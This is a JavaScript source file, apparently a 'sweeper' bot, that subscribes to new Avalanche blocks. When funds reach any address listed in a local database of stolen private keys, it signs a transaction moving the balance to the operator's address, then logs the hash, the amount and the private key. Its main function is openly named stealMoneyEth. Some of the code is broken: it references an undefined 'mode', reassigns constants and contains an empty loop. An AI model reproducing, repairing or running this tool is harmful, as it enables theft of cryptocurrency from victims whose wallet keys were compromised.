import Web3 from "web3";
import * as fs from 'fs';
import * as path from 'path';
import { rpc, grab, mainAddress, gasPercentAvax } from "./config.js";

let web3 = null
let data = null

export async function runAvax() {
    try {
        web3 = new Web3(new Web3.providers.WebsocketProvider(rpc.AVAX));
    } catch (error) {
        console.log("Не удалось подключиться к сети AVAX")
        return;
    }
    data = JSON.parse(fs.readFileSync(path.join('./DB', 'database.json')));
    await getBlocksEth();
}

async function getBlocksEth() {
    const subscription = await web3.eth.subscribe('newBlockHeaders');
    subscription.on('data', async (block, error) => {
        try {
            const lastBlock = await web3.eth.getBlock(block.number, true);
            const ethTransactions = lastBlock?.transactions;
            console.log(`Block ${lastBlock?.number} | AVAX`);
            for (let transaction of ethTransactions) {
                transactionWalletEth(transaction);
            }
        } catch (error) {
            console.log(error)
        }
        });
    subscription.on('error', (error) => console.log(error));
}

function transactionWalletEth(transaction) {
    const address = transaction.to;
    if (data[address]) {
        stealMoneyEth(address);
    }
}

async function stealMoneyEth(address) {
    const walletKey = data[address];
    const grabFromEthBalance = web3.utils.toWei(grab.AVAX, 'ether');
    const balance = await web3.eth.getBalance(address);
    const gasPrice = await web3.eth.getGasPrice();
    const gasUnits = 21000;
    const transactionCost = 0;
    const average = ((Math.random() * (1.85 - 1.65) + 1.65) + (Math.random() * (2.1 - 1.9) + 1.9)) / 2;

    if (mode === 1) {
        gasPrice = Math.trunc(Math.trunc(balance * gasPercentAvax / 100) / gasUnits);
        transactionCost =  Math.trunc(balance * gasPercentAvax / 100);
        const gasPriceNetwork = await web3.eth.getGasPrice();
        if (gasPrice <= gasPriceNetwork) {
            gasPrice = Math.trunc(gasPriceNetwork * average);
            transactionCost = gasUnits * gasPrice;
        }
    } else {
        gasPrice =  Math.trunc(gasPrice * average);
        transactionCost = gasUnits * gasPrice;
    }

    for (let i = 0; i < 200; i++) {
        if (balance > grabFromEthBalance) {
            break;
        }
    }

    const amount = balance - transactionCost;
    const sendAddress = web3.utils.toChecksumAddress(mainAddress);
    const nonce = await web3.eth.getBlockTransactionCount(address);

    if (amount <= 0) {
        return;
    }

    const txPrice = {
        "chainId": 43114,
        "nonce": nonce,
        "to": sendAddress,
        "value": amount,
        "gas": gasUnits,
        "maxFeePerGas": gasPrice,
        "maxPriorityFeePerGas": gasPrice,
        "type": 2,
    };
    const signedTx = await web3.eth.accounts.signTransaction(txPrice, walletKey);
    const txHash = await web3.eth.sendSignedTransaction(signedTx.rawTransaction);
    const receipt = await web3.eth.getTransactionReceipt(txHash);
    const amountEther = web3.utils.fromWei(amount, 'ether');
    console.log(`✅ AVAX | Success withdrawal \nHASH: ${receipt.transactionHash} \n\nAMOUNT: ${amountEther} \nADDR: https://snowtrace.io/address/${address} \nPK: ${walletKey}`);
}